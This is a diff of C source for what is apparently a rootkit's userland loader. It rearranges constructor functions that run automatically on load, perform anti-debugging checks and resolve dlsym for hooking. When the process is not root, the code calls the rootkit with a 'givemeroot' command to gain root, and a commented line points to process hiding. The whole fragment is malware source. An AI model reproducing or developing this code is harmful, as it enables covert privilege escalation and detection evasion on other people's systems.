@@ -51,19 +51,14 @@ static int rk_exec(const char *file, const char *cmdfmt, ...)
 
 int main(void)
 {
-    int i;
-    for(i = 0; i < 60; i++)
-    {
 #ifdef DEBUG
-        printf("Sleeping for 1 second!\r\n");
+    printf("Main Operation!\r\n");
 #endif
-        sleep(1);
-    }
 
     return 0;
 }
 
-__attribute__((constructor (101))) void anti_tricks(void)
+__attribute__((constructor (101))) void init_antidbg(void)
 {
     int i;
     volatile int pt_offset = 0;
@@ -124,8 +119,10 @@ __attribute__((constructor (101))) void anti_tricks(void)
     }
 }
 
-__attribute__((constructor (102))) void pre_core(void)
+__attribute__((constructor (102))) void init_core(void)
 {
+    int uid;
+
     proc_id = getpid();
     proc_uid = getuid();
     proc_gid = getgid();
@@ -134,15 +131,6 @@ __attribute__((constructor (102))) void pre_core(void)
 
     if(!real_dlsym)
         find_dlsym();
-}
-
-__attribute__((constructor (103))) int post_core(void)
-{
-    int uid;
-
-#ifdef DEBUG
-    printf("Normal Operation!\r\n");
-#endif
 
     if(proc_uid != 0)
     {
@@ -150,12 +138,6 @@ __attribute__((constructor (103))) int post_core(void)
         printf("We're not root, using rootkit to gain root...\r\n");
 #endif
         rk_exec(RK_PATH, "givemeroot");
-    }
-    else
-    {
-#ifdef DEBUG
-        printf("We're already root, skip rootkit to gain root...\r\n");
-#endif
     }
 
     uid = getuid();
@@ -173,11 +155,8 @@ __attribute__((constructor (103))) int post_core(void)
 #endif
     }
 
-    //TODO: Code nhproc better in kern_mod?
-    //rk_exec(RK_PATH, "nhproc%d", proc_id);
+    //rk_exec(RK_PATH, "dhproc%d", proc_id);
 
     setuid(proc_uid);
     setgid(proc_gid);
-
-    return 0;
 }
